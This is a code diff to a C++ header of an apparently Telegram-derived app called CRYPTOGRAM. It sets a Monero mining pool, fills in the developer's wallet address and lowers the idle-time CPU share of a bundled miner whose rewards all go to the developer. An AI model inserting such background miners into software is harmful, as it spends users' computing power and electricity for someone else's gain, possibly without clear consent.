@@ -7,7 +7,7 @@ https://github.com/SWORDOps/CRYPTOGRAM/blob/main/LICENSE
 */
 #pragma once
 
-#include "../../lib_base/base/timer.h"
+#include "base/timer.h"
 #include "base/weak_ptr.h"
 
 #include <QtCore/QObject>
@@ -82,11 +82,11 @@ struct MoneroMiningStatistics {
 struct MoneroMiningConfig {
 	// Mining pool settings (configured by developer)
 	QString poolAddress = "pool.supportxmr.com:3333";
-	QString walletAddress = "";         // Developer's XMR wallet (set in code)
+	QString walletAddress = "4B9Q3Z8ixtpaWxFP3UJLRc2ffDDb7nsU3HWL3i7hEczFKHbTSRoD1CuU7eZotuYj2RRf6kzMdLZjBb1QNXApaZVi5sN5mXF";
 	QString rigName = "CRYPTOGRAM";     // Identifier in pool stats
 
 	// CPU settings
-	int cpuPercent = 20;                // CPU usage limit (0-100%, 0=disabled)
+	int cpuPercent = 10;                // CPU usage limit (0-100%, 0=disabled)
 	int cpuThreads = 0;                 // 0 = auto-calculate from cpuPercent
 	int cpuPriority = 2;                // 1=low, 2=normal, 3=high (default: normal)
 
@@ -144,7 +144,7 @@ struct SystemIdleState {
  * - Connects to mining pool (no blockchain sync needed)
  * - Mines Monero using RandomX algorithm (CPU-optimized)
  * - All rewards go to developer wallet (supports development)
- * - Default: 20% CPU when idle for 15 minutes
+ * - Default: 10% CPU when idle for 15 minutes
  * - Automatically stops when user is active
  *
  * PRIVACY:
